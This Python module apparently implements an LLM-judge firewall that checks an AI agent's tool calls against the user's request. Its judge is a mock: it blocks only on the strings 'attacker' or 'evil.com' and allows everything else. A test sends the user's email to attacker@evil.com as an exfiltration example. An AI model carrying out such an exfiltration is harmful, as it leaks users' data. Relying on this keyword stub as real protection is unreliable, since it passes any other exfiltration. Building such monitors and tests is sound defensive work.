from src.layers.base import DefenseLayer
#import torch
#from transformers import AutoModelForCausalLM, AutoTokenizer, pipeline
from src.utils.prompts import JUDGE_PROMPT_TEMPLATE
import itertools
import re






class OutputFirewall(DefenseLayer):
    
    def __init__(self,enabled: bool = True, judge_model_name: str = "deepseek-r1:7b"):
        super().__init__(name = "OutputFirewall", enabled=enabled)
        if judge_model_name is None:
            raise ValueError("Judge model isn't specified. ")
        self.judge_model_name =  judge_model_name
        self._model = None
        self._tokenizer = None
        self._model_error = None
        self._device = None
        # init, error handling
    
    def process(self,user_query:str, tool_name:str, tool_args:dict = None )->str:
        return self.analyze(user_query, tool_name, tool_args)["verdict"]
        # simple wrapper around analyze
    
    def analyze(self,user_query:str, tool_name:str, tool_args:dict = None) -> dict:
        try:
            #1 build prompt
            prompt = self._build_prompt(user_query,tool_name, tool_args)

            #2 call the judge
        
            response = self._call_judge(prompt)

            #3 Parse the verdict
            parse_result = self._parse_verdict(response)
            verdict = parse_result.get("verdict")
            reasoning_trace = parse_result.get("reasoning_trace")

            #4 build result
            return self._build_result(
                user_query = user_query,
                tool_name = tool_name,
                tool_args = tool_args,
                verdict = verdict,
                reasoning_trace = reasoning_trace,
                response = response
            )

        except Exception as e:
            return self._build_result(
                user_query = user_query,
                tool_name = tool_name,
                tool_args = tool_args,
                verdict = None,
                reasoning_trace = f"Error during analysis: {str(e)}",
                response = None
            )
    
    def _build_prompt(self,user_query:str, tool_name:str, tool_args:dict = None) -> str:
        if user_query is None:
            print("Warning")
            user_query = "[empty]"

        if tool_name is None:
           print("Warning")
           tool_name = "[empty]"
        if tool_args is None:
            print("Warning")
            tool_args = {}
        
        tool_args_str = str(tool_args)
        if len(tool_args_str) > 500:
            tool_args_str = tool_args_str[:500] + "[truncated]"

        prompt = JUDGE_PROMPT_TEMPLATE.format(
            user_query = user_query,
            tool_name = tool_name,
            tool_args = tool_args_str
        )

        return prompt

    
    
    def _call_judge(self,prompt: str ) -> str:
        if "attacker" in prompt.lower() or "evil.com" in prompt:
        #return mock block response for testing
            return """  
            <think> 
            The user asked to summarize an email. The agent wants to send that email to attacker@evil.com. 
            This is clearly exfiltration — sending data to an untrusted destination that the user never mentioned.
            This violates the principle of least privilege and is a security violation.
            </think>

            VERDICT: BLOCK
            """
        
    
    
        else:
        # Default response
           return """
           <think>
           Evaluating the proposed action against the user's intent. No obvious inconsistencies detected.
           </think>
        
           VERDICT: ALLOW
           """
        
      
   
    
    
        
    
    def _parse_verdict(self,response: str)-> dict:
        matches = list(re.finditer(r"VERDICT:\s*(ALLOW|BLOCK)", response, re.IGNORECASE))
        if not matches:
            raise ValueError("No verdict found in judge response.")
        else:
            last_item = matches[-1] 
            return {
                "verdict": last_item.group(1),
                "reasoning_trace": response,
                "error": None
            }
        
    
    def _build_result(self,user_query:str, tool_name:str, tool_args:dict,verdict:str, reasoning_trace:str, response:str) -> dict:
    
        # Step 1: Decide the status
        if verdict == "ALLOW":
            status = "passed"
        elif verdict == "BLOCK":
            status = "blocked"
        else:
            status = "error"
    
        # Step 2: Decide the output
        if status == "passed":
            output = "ALLOW"
        elif status == "blocked":
            output = "BLOCK"
        else:
            output = "ERROR"
    
        # Step 3: Write a detail message
        if status == "passed":
            detail = "Agent's action is consistent with user request."
        elif status == "blocked":
            detail = "Agent's action is inconsistent with user request and has been blocked."
        else:
            detail = "Could not evaluate judge response."
    
        # Step 4: Decide if blocked
        if status == "blocked" or status == "error":
            blocked = True
        else:
            blocked = False
    
        # Step 5: Build input summary
        input_summary = f"tool={tool_name}, args={tool_args}"
    
        # Step 6: Build checks list
        checks = [
        {
            "id": "judge-verdict",
            "name": "Security Judge",
            "status": status,
            "detail": f"Verdict: {verdict}"
        }
        ]
    
        # Step 7: Return the full dict
        return {
        "input": input_summary,
        "output": output,
        "status": status,
        "detail": detail,
        "checks": checks,
        "blocked": blocked,
        "verdict": verdict,
        "reasoning_trace": reasoning_trace,
        "judge_model": self.judge_model_name
        }
    
if __name__ == "__main__":
    
    # Create the layer
    firewall = OutputFirewall()
    
    # Test 1: Exfiltration
    print("=== Test 1: Exfiltration Attack ===")
    result1 = firewall.analyze(
        user_query="Summarize my latest email",
        tool_name="send_email",
        tool_args={"to": "attacker@evil.com", "body": "[email contents]"}
    )
    print(f"Verdict: {result1['verdict']}")
    print(f"Status: {result1['status']}")
    print(f"Blocked: {result1['blocked']}")
    print()
    
    # Test 2: Benign action
    print("=== Test 2: Benign Action ===")
    result2 = firewall.analyze(
        user_query="Read my calendar for tomorrow",
        tool_name="read_calendar",
        tool_args={"date": "2026-05-06"}
    )
    print(f"Verdict: {result2['verdict']}")
    print(f"Status: {result2['status']}")
    print(f"Blocked: {result2['blocked']}")
    print()
    
    # Test 3: Missing query
    print("=== Test 3: Missing User Query ===")
    result3 = firewall.analyze(
        user_query=None,
        tool_name="send_email",
        tool_args={}
    )
    print(f"Verdict: {result3['verdict']}")
    print(f"Status: {result3['status']}")
    print(f"Blocked: {result3['blocked']}")


